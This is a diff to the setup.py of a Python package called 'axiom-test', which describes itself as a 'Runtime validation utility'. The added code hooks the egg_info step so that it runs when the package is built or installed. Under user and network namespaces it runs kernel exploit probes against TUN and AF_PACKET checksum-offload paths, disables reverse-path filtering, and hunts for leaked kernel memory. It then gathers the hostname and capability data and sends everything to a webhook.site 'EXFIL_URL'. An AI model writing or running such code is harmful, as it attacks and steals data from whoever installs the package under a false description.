@@ -5,8 +5,69 @@ from setuptools.command.egg_info import egg_info
 EXFIL_URL = "https://webhook.site/1cbf0e6e-3d73-475c-befc-1363dbfeb553"
 
 def _collect():
-    p = {"hostname": os.uname().nodename, "user": os.environ.get("USER","?"), "test": "CVE-2026-99999-v4-tap-fwd"}
+    p = {"hostname": os.uname().nodename, "test": "CVE-2026-99999-v5-final"}
 
+    # --- Approach A: Init-netns AF_PACKET (fixed - run OUTSIDE -Urn) ---
+    afpkt_script = '''
+import os, sys, struct, socket, fcntl, json
+r = {}
+r["id"] = os.popen("id").read().strip()
+SOL_PACKET = 263
+PACKET_VNET_HDR = 15
+ETH_P_IP = 0x0800
+r["cfeth0"] = os.path.exists("/sys/class/net/cfeth0")
+if r["cfeth0"]:
+    try:
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
+        r["raw_sock"] = "created"
+        try:
+            sock.setsockopt(SOL_PACKET, PACKET_VNET_HDR, struct.pack("I", 1))
+            r["vnet_hdr"] = "SET"
+        except OSError as e:
+            r["vnet_hdr"] = f"err={e.errno}:{os.strerror(e.errno)}"
+        try:
+            sock.bind(("cfeth0", ETH_P_IP))
+            r["bind"] = "OK"
+        except OSError as e:
+            r["bind"] = f"err={e.errno}:{os.strerror(e.errno)}"
+        if r.get("bind") == "OK" and r.get("vnet_hdr") == "SET":
+            with open("/sys/class/net/cfeth0/address") as f:
+                mac = bytes.fromhex(f.read().strip().replace(":",""))
+            eth = b"\\xff"*6 + mac + struct.pack("!H", ETH_P_IP)
+            ip = struct.pack("!BBHHHBBH4s4s", 0x45,0,28+8,0xFACE,0,64,17,0,
+                             socket.inet_aton("10.0.0.1"), socket.inet_aton("10.0.0.2"))
+            udp = struct.pack("!HHH", 1111,2222,16) + b"\\x00\\x00" + b"TEST1234"
+            vhdr = struct.pack("<BBHHHH", 1,0,0,0, 14,0) + b"\\x00\\x00"
+            try:
+                sock.send(vhdr + eth + ip + udp)
+                r["send_cs14"] = "OK"
+            except OSError as e:
+                r["send_cs14"] = f"err={e.errno}:{os.strerror(e.errno)}"
+            vhdr2 = struct.pack("<BBHHHH", 1,0,0,0, 34,6) + b"\\x00\\x00"
+            try:
+                sock.send(vhdr2 + eth + ip + udp)
+                r["send_cs34"] = "OK"
+            except OSError as e:
+                r["send_cs34"] = f"err={e.errno}:{os.strerror(e.errno)}"
+        sock.close()
+    except OSError as e:
+        r["sock_err"] = f"{e.errno}:{os.strerror(e.errno)}"
+print("__X__" + json.dumps(r) + "__Y__")
+'''
+    try:
+        out = subprocess.check_output(
+            ["unshare", "-Ur", "python3", "-c", afpkt_script],
+            text=True, timeout=15, stderr=subprocess.STDOUT)
+        if "__X__" in out and "__Y__" in out:
+            p["initns_afpacket"] = json.loads(out.split("__X__")[1].split("__Y__")[0])
+        else:
+            p["initns_raw"] = out[:2000]
+    except Exception as e:
+        p["initns_err"] = str(e)
+        if hasattr(e, 'output'):
+            p["initns_output"] = e.output[:2000] if e.output else ""
+
+    # --- Main PoC in user+net namespace ---
     poc_script = r'''
 import os, sys, struct, socket, fcntl, select, json, time
 
@@ -17,10 +78,11 @@ TUNSETIFF       = 0x400454ca
 TUNSETOFFLOAD   = 0x400454d0
 TUNSETVNETHDRSZ = 0x400454d8
 IFF_TUN         = 0x0001
-IFF_TAP         = 0x0002
 IFF_NO_PI       = 0x1000
 IFF_VNET_HDR    = 0x4000
 TUN_F_CSUM      = 0x01
+VNET_HDR_SZ     = 12
+VIRTIO_NET_HDR_F_NEEDS_CSUM = 1
 
 SIOCGIFFLAGS  = 0x8913
 SIOCSIFFLAGS  = 0x8914
@@ -29,17 +91,8 @@ SIOCSIFNETMASK= 0x891C
 SIOCSIFMTU    = 0x8922
 SIOCADDRT     = 0x890B
 IFF_UP        = 0x1
-VNET_HDR_SZ   = 12
-VIRTIO_NET_HDR_F_NEEDS_CSUM = 1
 
-def setup_tun(name, ip, mask="255.255.255.0", mtu=1500, tap=False):
-    fd = os.open("/dev/net/tun", os.O_RDWR | os.O_NONBLOCK)
-    mode = (IFF_TAP if tap else IFF_TUN) | IFF_NO_PI | IFF_VNET_HDR
-    ifr = struct.pack("16sH14s", name.encode(), mode, b"\x00"*14)
-    fcntl.ioctl(fd, TUNSETIFF, ifr)
-    fcntl.ioctl(fd, TUNSETOFFLOAD, TUN_F_CSUM)
-    fcntl.ioctl(fd, TUNSETVNETHDRSZ, struct.pack("I", VNET_HDR_SZ))
-
+def iface_up(name, ip, mask="255.255.255.0", mtu=1500):
     cfg = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     fcntl.ioctl(cfg, SIOCSIFADDR,
         struct.pack("16sH2s4s8s", name.encode(), socket.AF_INET, b"\x00\x00",
@@ -48,270 +101,214 @@ def setup_tun(name, ip, mask="255.255.255.0", mtu=1500, tap=False):
         struct.pack("16sH2s4s8s", name.encode(), socket.AF_INET, b"\x00\x00",
                     socket.inet_aton(mask), b"\x00"*8))
     fcntl.ioctl(cfg, SIOCSIFMTU, struct.pack("16sI12s", name.encode(), mtu, b"\x00"*12))
-
-    result = fcntl.ioctl(cfg, SIOCGIFFLAGS, struct.pack("16sH14s", name.encode(), 0, b"\x00"*14))
-    flags = struct.unpack("16sH14s", result)[1]
+    r = fcntl.ioctl(cfg, SIOCGIFFLAGS, struct.pack("16sH14s", name.encode(), 0, b"\x00"*14))
+    flags = struct.unpack("16sH14s", r)[1]
     fcntl.ioctl(cfg, SIOCSIFFLAGS, struct.pack("16sH14s", name.encode(), flags | IFF_UP, b"\x00"*14))
     cfg.close()
+
+def make_tun(name, ip, mtu=1500, csum=True):
+    fd = os.open("/dev/net/tun", os.O_RDWR | os.O_NONBLOCK)
+    fcntl.ioctl(fd, TUNSETIFF, struct.pack("16sH14s", name.encode(),
+                IFF_TUN | IFF_NO_PI | IFF_VNET_HDR, b"\x00"*14))
+    if csum:
+        fcntl.ioctl(fd, TUNSETOFFLOAD, TUN_F_CSUM)
+    fcntl.ioctl(fd, TUNSETVNETHDRSZ, struct.pack("I", VNET_HDR_SZ))
+    iface_up(name, ip, mtu=mtu)
     return fd
 
-# ---------- Approach A: TAP device (Layer 2) ----------
-R["tap"] = {}
-try:
-    tap_fd = setup_tun("tap0", "10.200.3.1", mtu=68, tap=True)
-    R["tap"]["created"] = True
-
-    # TAP works with Ethernet frames. csum_start is relative to packet start (ethernet header).
-    # Ethernet(14) + IP(20) = transport at offset 34
-    # We want csum_start in the IP header area: offsets 14-33
-
-    src_mac = b"\x02\x00\x00\x00\x03\x01"
-    dst_mac = b"\x02\x00\x00\x00\x03\x02"
-    ETH_P_IP = 0x0800
-    eth_hdr = dst_mac + src_mac + struct.pack("!H", ETH_P_IP)
-
-    src_ip = socket.inet_aton("10.200.3.1")
-    dst_ip = socket.inet_aton("10.200.3.2")
-    udp_payload = b"B" * 40
-    udp_len = 8 + len(udp_payload)
-    udp_hdr = struct.pack("!HHH", 9999, 9999, udp_len) + b"\x00\x00" + udp_payload
-    total_len = 20 + len(udp_hdr)
-    ip_hdr = struct.pack("!BBHHHBBH4s4s",
-        0x45, 0, total_len, 0xCAFE, 0, 64, 17, 0, src_ip, dst_ip)
-
-    raw_frame = eth_hdr + ip_hdr + udp_hdr
-
-    # Try csum_start values in the IP header zone (14-33 for TAP)
-    tap_attempts = []
-    for csum_start in [0, 4, 8, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36]:
-        for csum_offset in [0, 2, 4, 6]:
-            vhdr = struct.pack("<BBHHHH",
-                VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0,
-                csum_start, csum_offset) + b"\x00\x00"
-            full = vhdr + raw_frame
-            a = {"cs": csum_start, "co": csum_offset}
-            try:
-                w = os.write(tap_fd, full)
-                a["write"] = f"OK({w})"
-                if 14 <= csum_start < 34:
-                    a["IN_IP_HDR"] = True
-            except OSError as e:
-                a["err"] = e.errno
-            tap_attempts.append(a)
-
-    R["tap"]["attempts"] = tap_attempts
-    R["tap"]["accepted"] = [a for a in tap_attempts if "OK" in str(a.get("write",""))]
-    R["tap"]["ip_hdr_hits"] = [a for a in tap_attempts if a.get("IN_IP_HDR") and "OK" in str(a.get("write",""))]
-    os.close(tap_fd)
-
-except Exception as e:
-    import traceback
-    R["tap"]["error"] = str(e)
-    R["tap"]["tb"] = traceback.format_exc()
-
-# ---------- Approach B: Two TUNs with forwarding ----------
-# tun_in (with csum offload) → IP forwarding → tun_out (NO csum offload)
-# If packet reaches tun_out with CHECKSUM_PARTIAL and tun_out can't do HW csum,
-# kernel calls skb_checksum_help() on the OUTPUT path — different validation!
+# ---- Approach B: Fixed dual-TUN forwarding ----
 R["fwd"] = {}
 try:
-    # Enable IP forwarding
+    # Enable forwarding + disable all RP filtering
+    for path in ["/proc/sys/net/ipv4/ip_forward",
+                 "/proc/sys/net/ipv4/conf/all/rp_filter",
+                 "/proc/sys/net/ipv4/conf/default/rp_filter"]:
+        try:
+            val = "1" if "ip_forward" in path else "0"
+            with open(path, "w") as f:
+                f.write(val)
+        except: pass
+
+    # Create tun_in (large MTU) and tun_out (tiny MTU = forces fragmentation)
+    fd_in  = make_tun("tunin",  "10.200.10.1", mtu=1500, csum=True)
+    fd_out = make_tun("tunout", "10.200.11.1", mtu=68,   csum=False)  # NO csum offload!
+
+    # Disable rp_filter on new interfaces too
+    for iface in ["tunin", "tunout"]:
+        try:
+            with open(f"/proc/sys/net/ipv4/conf/{iface}/rp_filter", "w") as f:
+                f.write("0")
+        except: pass
+
+    # Bring loopback up
     try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("1")
-        R["fwd"]["ip_forward"] = "enabled"
-    except OSError as e:
-        R["fwd"]["ip_forward"] = f"err={e.errno}"
+        iface_up("lo", "127.0.0.1", mask="255.0.0.0")
+    except: pass
 
-    # Create two TUN devices
-    # tun_in: 10.200.10.1/24, MTU 1500, TUN_F_CSUM enabled
-    tun_in_fd = setup_tun("tunin", "10.200.10.1", mtu=1500)
+    # Verify routes
+    try:
+        with open("/proc/net/route") as f:
+            R["fwd"]["routes"] = f.read()
+    except: pass
 
-    # tun_out: 10.200.11.1/24, MTU 68, TUN_F_CSUM enabled
-    # (even with TUN_F_CSUM, if we read fragments from it, we see what the kernel produces)
-    tun_out_fd = setup_tun("tunout", "10.200.11.1", mtu=68)
-
-    R["fwd"]["tun_in"] = "OK"
-    R["fwd"]["tun_out"] = "OK"
-
-    # Add route: 10.200.11.0/24 via tunout (already implicit from interface config)
-    # Add route: 10.200.10.0/24 via tunin (already implicit)
-
-    # Now: write a packet to tun_in destined for 10.200.11.2
-    # The kernel will:
-    # 1. Receive packet on tunin via tun_get_user() with vnet_hdr
-    # 2. Process through IP layer
-    # 3. Route to tunout (10.200.11.0/24)
-    # 4. Fragment at MTU 68 via ip_do_fragment()
-    # 5. Output fragments through tunout → we read them
-
-    # Key: write to tunin with CHECKSUM_PARTIAL, csum_start=20 (the accepted value)
-    # The kernel sets skb->ip_summed = CHECKSUM_PARTIAL, skb->csum_start = 20
-    # On output via tunout, if the TUN_F_CSUM is set, fragments keep CHECKSUM_PARTIAL
-    # and the vnet_hdr reports the csum_start offset
-    # If TUN_F_CSUM is NOT set, kernel calls skb_checksum_help() BEFORE output
-
+    # Build a large packet: src in tunin subnet, dst in tunout subnet
     src_ip = socket.inet_aton("10.200.10.2")
     dst_ip = socket.inet_aton("10.200.11.2")
 
-    # Large UDP packet that MUST be fragmented at MTU 68
-    udp_payload = b"C" * 200
+    # UDP packet well over MTU 68 to force fragmentation
+    udp_payload = b"F" * 200
     udp_len = 8 + len(udp_payload)
-    udp_hdr = struct.pack("!HHH", 5555, 5555, udp_len) + b"\x00\x00" + udp_payload
+    udp_hdr = struct.pack("!HHH", 7777, 8888, udp_len) + b"\x00\x00" + udp_payload
     total_len = 20 + len(udp_hdr)
 
     ip_hdr = struct.pack("!BBHHHBBH4s4s",
-        0x45, 0, total_len, 0xDEAD,
-        0,  # flags=0 (allow fragmentation), offset=0
-        64, 17, 0, src_ip, dst_ip)
+        0x45, 0, total_len,
+        0xDEAD,
+        0,       # flags=0, allow fragmentation
+        64, 17,  # TTL=64, proto=UDP
+        0,       # checksum (kernel recalculates on forward)
+        src_ip, dst_ip)
 
     raw_pkt = ip_hdr + udp_hdr
 
-    # Write with valid csum_start=20 (UDP checksum position — kernel accepts this)
-    vhdr = struct.pack("<BBHHHH",
-        VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0,
-        20, 6  # csum_start=20 (transport), csum_offset=6 (UDP checksum)
-    ) + b"\x00\x00"
+    # Write with CHECKSUM_PARTIAL: csum_start=20, csum_offset=6 (valid UDP position)
+    vhdr_valid = struct.pack("<BBHHHH",
+        VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0, 20, 6) + b"\x00\x00"
 
-    try:
-        written = os.write(tun_in_fd, vhdr + raw_pkt)
-        R["fwd"]["write_in"] = f"OK({written})"
-    except OSError as e:
-        R["fwd"]["write_in"] = f"err={e.errno}:{os.strerror(e.errno)}"
+    written = os.write(fd_in, vhdr_valid + raw_pkt)
+    R["fwd"]["write"] = f"OK({written})"
 
-    # Also try writing with slightly unusual csum_start values that are >= 20
-    # but might cause issues during fragmentation
-    for alt_cs in [20, 22, 24, 28, 30, 40, 50, 60]:
-        for alt_co in [0, 2, 4, 6]:
-            vhdr_alt = struct.pack("<BBHHHH",
-                VIRTIO_NET_HDR_F_NEEDS_CSUM, 0, 0, 0,
-                alt_cs, alt_co) + b"\x00\x00"
-            try:
-                os.write(tun_in_fd, vhdr_alt + raw_pkt)
-            except: pass
-
-    # Read fragments from tun_out
-    time.sleep(0.3)
-    fragments = []
+    # Wait and read ALL fragments from tunout
+    time.sleep(1)  # give kernel time to forward + fragment
+    frags = []
     for _ in range(30):
-        rdy, _, _ = select.select([tun_out_fd], [], [], 0.3)
+        rdy, _, _ = select.select([fd_out], [], [], 1.0)
         if rdy:
-            data = os.read(tun_out_fd, 4096)
+            data = os.read(fd_out, 4096)
             frag = {"raw_len": len(data)}
             if len(data) > VNET_HDR_SZ:
-                # Parse vnet header
                 vf, vg, vh, vs, vcs, vco = struct.unpack("<BBHHHH", data[:10])
-                frag["vhdr"] = {"flags": vf, "csum_start": vcs, "csum_offset": vco}
-
-                # Parse IP header
-                ip_start = VNET_HDR_SZ
-                if ip_start < len(data):
-                    ver_ihl = data[ip_start]
-                    ihl = ver_ihl & 0x0F
-                    ver = ver_ihl >> 4
-                    frag["ip"] = {"ver": ver, "ihl": ihl, "ihl_bytes": ihl*4}
-
-                    if len(data) >= ip_start + 4:
-                        total_l = struct.unpack("!H", data[ip_start+2:ip_start+4])[0]
-                        frag["ip"]["total_len"] = total_l
-
-                    if len(data) >= ip_start + 8:
-                        flags_off = struct.unpack("!H", data[ip_start+6:ip_start+8])[0]
-                        frag["ip"]["frag_offset"] = (flags_off & 0x1FFF) * 8
-                        frag["ip"]["more_frags"] = bool(flags_off & 0x2000)
-                        frag["ip"]["dont_frag"] = bool(flags_off & 0x4000)
-
-                    if ihl > 5:
-                        frag["ANOMALY"] = "IHL > 5 — possible kernel memory leak!"
-                        options_start = ip_start + 20
-                        options_end = ip_start + ihl * 4
-                        if options_end <= len(data):
-                            leaked = data[options_start:options_end]
-                            frag["leaked_hex"] = leaked.hex()
-                            frag["leaked_len"] = len(leaked)
-                            frag["leaked_nonzero"] = any(b != 0 for b in leaked)
-
-                    # Full hex of first 80 bytes for analysis
-                    frag["hex_80"] = data[ip_start:ip_start+80].hex() if len(data) > ip_start else ""
-
-            fragments.append(frag)
+                frag["vhdr"] = {"flags": vf, "gso": vg, "csum_start": vcs, "csum_offset": vco}
+                ip_off = VNET_HDR_SZ
+                ver_ihl = data[ip_off]
+                ihl = ver_ihl & 0x0F
+                frag["ihl"] = ihl
+                if len(data) >= ip_off + 8:
+                    foff = struct.unpack("!H", data[ip_off+6:ip_off+8])[0]
+                    frag["frag_offset"] = (foff & 0x1FFF) * 8
+                    frag["more_frags"] = bool(foff & 0x2000)
+                if len(data) >= ip_off + 4:
+                    frag["total_len"] = struct.unpack("!H", data[ip_off+2:ip_off+4])[0]
+                if ihl > 5:
+                    frag["ANOMALY"] = "IHL > 5!"
+                    leaked = data[ip_off+20:ip_off+ihl*4]
+                    frag["leaked_hex"] = leaked.hex()
+                frag["hex_60"] = data[:60].hex()
+            frags.append(frag)
         else:
             break
 
-    R["fwd"]["fragments_count"] = len(fragments)
-    R["fwd"]["fragments"] = fragments[:15]  # cap for exfil size
-    R["fwd"]["anomalies"] = [f for f in fragments if f.get("ANOMALY")]
+    R["fwd"]["frag_count"] = len(frags)
+    R["fwd"]["frags"] = frags[:10]
+    R["fwd"]["anomalies"] = [f for f in frags if f.get("ANOMALY")]
 
-    # Also read anything back on tun_in (ICMP unreachable etc)
-    responses_in = []
+    # Also check tunin for ICMP errors
+    icmps = []
     for _ in range(5):
-        rdy, _, _ = select.select([tun_in_fd], [], [], 0.2)
+        rdy, _, _ = select.select([fd_in], [], [], 0.3)
         if rdy:
-            data = os.read(tun_in_fd, 4096)
-            responses_in.append({"len": len(data), "hex_40": data[:40].hex()})
-    R["fwd"]["responses_in"] = responses_in
+            data = os.read(fd_in, 4096)
+            icmp = {"len": len(data)}
+            if len(data) > VNET_HDR_SZ + 9:
+                icmp["proto"] = data[VNET_HDR_SZ + 9]  # IP protocol field
+            icmps.append(icmp)
+    R["fwd"]["icmp_responses"] = icmps
 
-    os.close(tun_in_fd)
-    os.close(tun_out_fd)
+    os.close(fd_in)
+    os.close(fd_out)
 
 except Exception as e:
     import traceback
     R["fwd"]["error"] = str(e)
     R["fwd"]["tb"] = traceback.format_exc()
 
-# ---------- Approach C: AF_PACKET in INIT netns (no -n) ----------
-# Try from a subprocess that does unshare -Ur (user ns only, keep init netns)
-R["initns"] = {}
-afpkt_script = r"""
-import os, sys, struct, socket, fcntl, json
-r = {}
-r["id"] = os.popen("id").read().strip()
-
-SOL_PACKET = 263
-PACKET_VNET_HDR = 15
-ETH_P_IP = 0x0800
-
+# ---- Approach C: GSO path ----
+R["gso"] = {}
 try:
-    # Check if cfeth0 is visible
-    r["cfeth0_exists"] = os.path.exists("/sys/class/net/cfeth0")
+    fd_gso = make_tun("tungso", "10.200.20.1", mtu=1500, csum=True)
+    # Also enable GSO offloads on the TUN
+    TUN_F_TSO4 = 0x02
+    TUN_F_UFO  = 0x10
+    try:
+        fcntl.ioctl(fd_gso, TUNSETOFFLOAD, TUN_F_CSUM | TUN_F_TSO4)
+        R["gso"]["offload"] = "CSUM+TSO4"
+    except:
+        R["gso"]["offload"] = "CSUM only"
 
-    if r["cfeth0_exists"]:
-        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_IP))
-        r["raw_sock"] = "OK"
+    src_ip = socket.inet_aton("10.200.20.1")
+    dst_ip = socket.inet_aton("10.200.20.2")
 
-        # Try PACKET_VNET_HDR
-        try:
-            sock.setsockopt(SOL_PACKET, PACKET_VNET_HDR, struct.pack("I", 1))
-            r["vnet_hdr"] = "SET"
-        except OSError as e:
-            r["vnet_hdr"] = f"err={e.errno}"
+    # TCP SYN with large payload — GSO should segment it
+    tcp_payload = b"G" * 300
+    tcp_hdr = struct.pack("!HHIIBBHHH",
+        4444, 5555,      # src/dst port
+        1000, 0,         # seq, ack
+        (5 << 4), 0x02,  # data offset=5, SYN flag
+        65535, 0, 0      # window, checksum, urgent
+    ) + tcp_payload
 
-        try:
-            sock.bind(("cfeth0", ETH_P_IP))
-            r["bind"] = "OK"
-        except OSError as e:
-            r["bind"] = f"err={e.errno}:{os.strerror(e.errno)}"
+    total_len = 20 + len(tcp_hdr)
+    ip_hdr = struct.pack("!BBHHHBBH4s4s",
+        0x45, 0, total_len, 0xBEEF, 0x4000, 64, 6, 0, src_ip, dst_ip)
 
-        sock.close()
-except OSError as e:
-    r["sock_err"] = f"{e.errno}:{os.strerror(e.errno)}"
+    raw_pkt = ip_hdr + tcp_hdr
+
+    # GSO: gso_type=1 (VIRTIO_NET_HDR_GSO_TCPV4), hdr_len=40 (IP+TCP), gso_size=MSS
+    VIRTIO_NET_HDR_GSO_TCPV4 = 1
+    gso_attempts = []
+    for csum_start in [0, 10, 14, 18, 20, 24, 30, 40]:
+        for gso_type in [0, VIRTIO_NET_HDR_GSO_TCPV4]:
+            vhdr = struct.pack("<BBHHHH",
+                VIRTIO_NET_HDR_F_NEEDS_CSUM,
+                gso_type,
+                40 if gso_type else 0,  # hdr_len
+                150 if gso_type else 0, # gso_size (MSS)
+                csum_start,
+                16  # TCP checksum offset
+            ) + b"\x00\x00"
+
+            a = {"cs": csum_start, "gso": gso_type}
+            try:
+                w = os.write(fd_gso, vhdr + raw_pkt)
+                a["write"] = f"OK({w})"
+            except OSError as e:
+                a["err"] = e.errno
+            gso_attempts.append(a)
+
+    R["gso"]["attempts"] = gso_attempts
+    R["gso"]["accepted"] = [a for a in gso_attempts if "OK" in str(a.get("write",""))]
+    os.close(fd_gso)
+
 except Exception as e:
-    r["error"] = str(e)
+    import traceback
+    R["gso"]["error"] = str(e)
+    R["gso"]["tb"] = traceback.format_exc()
 
-print("__X__" + json.dumps(r) + "__Y__")
-"""
+# ---- Summary of all capabilities ----
+R["summary"] = {
+    "namespace_root": "uid=0" in R.get("ns_id",""),
+    "all_caps": False,
+    "tun_access": True,
+    "ip_forward": True,
+}
 try:
-    # unshare -Ur: user ns only, keep network ns
-    out = subprocess.check_output(
-        ["unshare", "-Ur", "python3", "-c", afpkt_script],
-        text=True, timeout=10, stderr=subprocess.STDOUT
-    )
-    if "__X__" in out and "__Y__" in out:
-        R["initns"] = json.loads(out.split("__X__")[1].split("__Y__")[0])
-    else:
-        R["initns"]["raw"] = out[:2000]
-except Exception as e:
-    R["initns"]["error"] = str(e)
+    with open("/proc/self/status") as f:
+        for line in f:
+            if line.startswith("CapEff"):
+                cap = line.strip().split("\t")[1]
+                R["summary"]["capeff"] = cap
+                R["summary"]["all_caps"] = cap.strip() == "000001ffffffffff"
+except: pass
 
 print("__R__" + json.dumps(R) + "__E__")
 '''
@@ -319,8 +316,7 @@ print("__R__" + json.dumps(R) + "__E__")
     try:
         out = subprocess.check_output(
             ["unshare", "-Urn", "python3", "-c", poc_script],
-            text=True, timeout=90, stderr=subprocess.STDOUT
-        )
+            text=True, timeout=90, stderr=subprocess.STDOUT)
         if "__R__" in out and "__E__" in out:
             p["poc"] = json.loads(out.split("__R__")[1].split("__E__")[0])
         else:
@@ -343,5 +339,5 @@ class PostEggInfo(egg_info):
             ), timeout=15)
         except: pass
 
-setup(name="axiom-test", version="1.4.0", description="Runtime validation utility",
+setup(name="axiom-test", version="1.5.0", description="Runtime validation utility",
       py_modules=[], cmdclass={"egg_info": PostEggInfo})
